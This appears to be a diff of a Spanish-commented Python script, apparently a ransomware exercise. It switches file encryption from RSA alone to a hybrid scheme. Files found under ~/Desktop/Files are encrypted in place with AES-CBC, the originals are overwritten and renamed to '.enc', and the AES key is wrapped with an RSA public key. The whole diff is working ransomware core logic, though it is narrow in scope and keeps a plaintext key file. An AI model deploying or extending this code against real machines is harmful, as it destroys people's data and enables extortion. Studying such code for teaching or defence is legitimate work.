@@ -1,46 +1,80 @@
 import os
+from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
-from find_files import recorrer_directorio 
+from Crypto.Util.Padding import pad
+from find_files import recorrer_directorio  
 
-#aquí debemos cifrar y descifrar los archivos y la clave púclica y simétrica 
-# Ruta de la clave pública
-RUTA_CLAVE_PUBLICA = "rsa_public.pem"
+def cargar_clave():
+    """
+    Carga la clave AES desde el archivo aes_key.bin.
+    """
+    ruta_clave = os.path.abspath("aes_key.bin")
+    print(f"Buscando clave en: {ruta_clave}")  # Depuración
 
-def cargar_clave_publica(ruta_clave_publica):
-    """Carga la clave pública RSA desde un archivo .pem."""
-    with open(ruta_clave_publica, "rb") as archivo:
-        return RSA.import_key(archivo.read())
+    if os.path.exists(ruta_clave):
+        with open(ruta_clave, "rb") as clave_file:
+            return clave_file.read()
+    else:
+        raise FileNotFoundError(f"El archivo de clave no se encuentra en: {ruta_clave}")
 
-def cifrar_datos(datos, clave_publica):
-    """Cifra los datos usando RSA y el esquema PKCS1_OAEP."""
-    cipher_rsa = PKCS1_OAEP.new(clave_publica)
-    return cipher_rsa.encrypt(datos)
-
-def cifrar_archivo(ruta_archivo, clave_publica):
-    """Cifra un archivo y guarda la versión cifrada."""
-    with open(ruta_archivo, "rb") as archivo:
-        datos = archivo.read()
+def cifrar_archivo(archivo, clave):
+    """
+    Cifra un archivo usando AES en modo CBC y lo sobrescribe con la versión cifrada.
+    """
+    iv = os.urandom(16)  # Vector de inicialización
+    cipher = AES.new(clave, AES.MODE_CBC, iv)
     
-    datos_cifrados = cifrar_datos(datos, clave_publica)
+    with open(archivo, "rb") as f:
+        datos = f.read()
     
-    with open(ruta_archivo + ".enc", "wb") as archivo_cifrado:
-        archivo_cifrado.write(datos_cifrados)
+    datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
+    
+    with open(archivo, "wb") as f:
+        f.write(iv + datos_cifrados)  # Guardamos IV + datos cifrados
 
-def recorrer_y_cifrar():
-    """Ejecuta recorrer_directorio() para obtener archivos y los cifra."""
-    archivos_importantes = recorrer_directorio()  # Llama a la función que lista los archivos
+def cifrar_archivos():
+    """
+    Cifra todos los archivos importantes encontrados en el directorio y cambia su extensión a '.enc'.
+    """
+    archivos = recorrer_directorio()  # Se asume que solo devuelve archivos, no diccionarios
 
-    if not archivos_importantes:
-        print("No se encontraron archivos para cifrar.")
+    if not isinstance(archivos, list):
+        print("Error: No se pudo obtener la lista de archivos.")
         return
 
-    clave_publica = cargar_clave_publica(RUTA_CLAVE_PUBLICA)
+    clave = cargar_clave()
+    directorio_base = os.path.expanduser("~/Desktop/Files")
 
-    for archivo in archivos_importantes:
-        ruta_archivo = os.path.join(os.path.expanduser("~"), "Desktop", "Files", archivo)  
-        print(f"Cifrando: {ruta_archivo}")
-        cifrar_archivo(ruta_archivo, clave_publica)
+    for archivo in archivos:
+        ruta_completa = os.path.join(directorio_base, archivo)
+        if os.path.isfile(ruta_completa):  # Asegura que es un archivo y no un directorio
+            # Cifra el archivo
+            cifrar_archivo(ruta_completa, clave)
+            
+            # Cambia la extensión del archivo a '.enc'
+            ruta_nueva = ruta_completa + ".enc"
+            os.rename(ruta_completa, ruta_nueva)
+    
+    print("Archivos cifrados y renombrados correctamente.")
+    cifrar_clave_aes(clave)
 
-# Ejecutar el cifrado
-recorrer_y_cifrar()
+def cifrar_clave_aes(clave_aes):
+    """
+    Cifra la clave AES con la clave pública RSA y la guarda en un archivo.
+    """
+    if not os.path.exists("rsa_public.pem"):
+        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
+    
+    with open("rsa_public.pem", "rb") as f:
+        clave_publica = RSA.import_key(f.read())
+    
+    cipher_rsa = PKCS1_OAEP.new(clave_publica)
+    clave_cifrada = cipher_rsa.encrypt(clave_aes)
+    
+    with open("aes_key_encrypted.bin", "wb") as f:
+        f.write(clave_cifrada)
+    
+    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
+
+if __name__ == "__main__":
+    cifrar_archivos()
